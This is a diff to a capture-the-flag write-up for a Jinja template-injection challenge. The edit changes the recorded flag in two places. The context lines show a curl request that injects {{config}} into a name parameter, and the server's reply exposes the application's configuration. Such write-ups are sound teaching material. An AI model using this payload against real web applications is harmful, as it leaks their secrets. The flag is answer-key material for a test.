@@ -52,7 +52,7 @@ $ curl -s --globoff "http://192.99.247.166:8083/saludo?nombre={{config}}"
 
 Response contains:
 ```html
-<h2 style='justify-content:center;'>Hola, <Config {'DEBUG': False, 'TESTING': False, ..., 'FLAG': 'EVIL{ssti_j1nj4_rce_cl4ssic}'}></h2>
+<h2 style='justify-content:center;'>Hola, <Config {'DEBUG': False, 'TESTING': False, ..., 'FLAG': 'EVIL{ssti_j1nj4_rce_cl4ss1c}'}></h2>
 ```
 
 Note: `--globoff` is required to prevent curl from interpreting `{}` as glob patterns.
@@ -60,7 +60,7 @@ Note: `--globoff` is required to prevent curl from interpreting `{}` as glob pat
 ## Flag
 
 ```
-EVIL{ssti_j1nj4_rce_cl4ssic}
+EVIL{ssti_j1nj4_rce_cl4ss1c}
 ```
 
 ## Key Takeaways
